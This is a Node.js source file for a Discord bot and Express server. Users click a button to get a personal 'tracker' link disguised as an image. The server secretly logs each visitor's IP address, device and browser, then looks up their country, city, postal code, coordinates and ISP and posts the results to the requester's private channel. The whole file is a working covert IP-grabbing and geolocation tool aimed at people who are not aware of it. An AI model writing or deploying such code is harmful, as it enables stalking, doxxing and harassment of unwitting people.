const express = require('express');
const cors = require('cors');
const maxmind = require('maxmind');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const DeviceDetector = require('device-detector-js');
require('dotenv').config();

const {
  Client,
  GatewayIntentBits,
  Partials,
  Events,
  ButtonBuilder,
  ActionRowBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField
} = require('discord.js');

// CONFIG
const port = process.env.PORT || 3000;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
const CLIENTS_FILE = './clients.json';
const TRACKER_MESSAGE_FILE = './tracker-message.json';

// EXPRESS SERVER
const app = express();
app.use(cors());
const deviceDetector = new DeviceDetector();

let lookup;
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();

app.get('/image.jpg', async (req, res) => {
  const queryId = req.query.u;
  if (!queryId) return res.status(400).send("Lien invalide");

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  let log = `📸 **Image piégée ouverte !**\n`;
  log += `IP : ${ip}\n`;
  log += `Appareil : ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}\n`;

  try {
    const geo = lookup.get(ip);
    const loc = geo?.location;

    log += `🌍 Localisation :\n`;
    log += `• Pays : ${geo?.country?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Région : ${geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Ville : ${geo?.city?.names?.fr || '❌ Introuvable'}\n`;
    log += `• Code postal : ${geo?.postal?.code || '❌ Introuvable'}\n`;
    log += `• Coordonnées : ${loc?.latitude || '?'} , ${loc?.longitude || '?'}\n`;
    log += `• FAI : ${geo?.traits?.isp || '❌ Introuvable'}\n`;

    const proxyFlags = [];
    if (geo?.traits?.is_anonymous_proxy) proxyFlags.push("🔒 Proxy anonyme");
    if (geo?.traits?.is_satellite_provider) proxyFlags.push("🛰️ Satellite");
    if (geo?.traits?.is_legitimate_proxy) proxyFlags.push("🧪 Proxy déclaré");

    log += proxyFlags.length > 0
      ? `⚠️ Réseau suspect :\n- ${proxyFlags.join('\n- ')}\n`
      : `✅ Connexion légitime\n`;

  } catch (err) {
    log += `❌ Erreur de géolocalisation : ${err.message}`;
  }

  console.log(log);

  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[queryId];

      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          content: log
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }
  } catch (err) {
    console.log("❌ Erreur Discord log :", err.message);
  }

  res.status(204).send();
});
app.listen(port, () => {
  console.log(`🛰️ Serveur Express actif sur le port ${port}`);
});

// DISCORD BOT
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
  partials: [Partials.Channel]
});

client.once(Events.ClientReady, async () => {
  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);

  const guild = client.guilds.cache.first();
  const channel = guild.channels.cache.find(c => c.name.includes("génère") && c.isTextBased());

  if (!channel) return console.log("❌ Salon 'génère-lien-tracker' introuvable");

  let messageId;

  if (fs.existsSync(TRACKER_MESSAGE_FILE)) {
    const data = JSON.parse(fs.readFileSync(TRACKER_MESSAGE_FILE));
    messageId = data.messageId;

    try {
      const msg = await channel.messages.fetch(messageId);
      if (msg) {
        console.log("✅ Message existant déjà présent.");
        return;
      }
    } catch (e) {
      console.log("⚠️ Ancien message introuvable. On va en recréer un.");
    }
  }

  const bouton = new ButtonBuilder()
    .setCustomId("generate_tracker")
    .setLabel("🔗 Générer mon lien")
    .setStyle(ButtonStyle.Primary);

  const row = new ActionRowBuilder().addComponents(bouton);

  const message = await channel.send({
    content: "🎯 Clique sur le bouton ci-dessous pour générer ton lien tracker personnalisé 👇",
    components: [row]
  });

  fs.writeFileSync(TRACKER_MESSAGE_FILE, JSON.stringify({ messageId: message.id }, null, 2));
  console.log("✅ Message avec bouton envoyé !");
});

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId !== "generate_tracker") return;

  try {
    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;
    const user = interaction.user;

    const shortId = crypto.randomBytes(3).toString("hex");
    const channelName = `🔗・mon-lien-tracker-${shortId}`;

    const privateChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [PermissionsBitField.Flags.SendMessages] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    });

    const uniqueId = `${user.id}_${shortId}`;
    const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;

    await privateChannel.send({
      content: `🎯 Voici ton lien tracker unique :\n<${trackerUrl}>\n\n🕵️‍♂️ Les connexions détectées s'afficheront ici automatiquement.`
    });

    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }

    clients[uniqueId] = privateChannel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));

    await interaction.editReply({
      content: `✅ Ton lien a été généré ici : <#${privateChannel.id}>`,
      ephemeral: true
    });

  } catch (err) {
    console.error("❌ Erreur interaction :", err);
    if (interaction.replied || interaction.deferred) {
      await interaction.editReply({ content: "❌ Une erreur est survenue." });
    } else {
      await interaction.reply({ content: "❌ Impossible de traiter la demande.", ephemeral: true });
    }
  }
});

client.login(DISCORD_TOKEN);
